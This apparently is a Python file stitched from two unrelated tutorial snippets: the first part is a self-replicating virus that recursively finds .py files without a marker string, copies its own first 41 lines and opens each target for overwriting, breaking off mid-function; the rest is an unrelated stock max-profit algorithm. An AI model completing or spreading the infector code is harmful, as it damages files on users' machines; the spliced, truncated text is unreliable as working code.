#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program for the above approach
def max_profit(prices: list, days: int) -> int:
 
    profit = 0
 
    for i in range(1, days):
 
        # checks if elements are adjacent and in increasing order
        if prices[i] > prices[i-1]:
 
            # difference added to 'profit'
            profit += prices[i] - prices[i-1]
 
    return profit
 
 
# Driver Code
if __name__ == '__main__':
 
    # stock prices on consecutive days
    prices = [100, 180, 260, 310, 40, 535, 695]
 
    # function call
    profit = max_profit(prices, len(prices))
    print(profit)
 
    # This code is contributed by vishvofficial.
'''
Time Complexity: O(N), Traversing over the array of size N
Space Complexity: O(1)
'''